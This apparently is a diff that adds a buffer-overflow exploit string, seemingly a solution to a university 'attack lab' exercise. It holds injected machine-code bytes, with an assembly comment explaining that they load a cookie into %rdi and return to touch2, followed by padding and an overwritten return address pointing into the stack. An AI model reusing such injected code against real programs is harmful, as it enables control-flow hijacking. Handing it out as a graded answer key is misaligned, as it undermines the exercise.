@@ -1,0 +1,15 @@
+
+/*
+movq $0x7a2b633b,%rdi # put the cookie into rdi to pass to touch2
+push $0x40194d # push the address of touch2 onto the stack to be returned to
+retq # return to touch2
+*/
+
+48 c7 c7 3b 63 2b 7a 68 
+4d 19 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Address of stack */
+48 bd 65 55 00 00 00 00
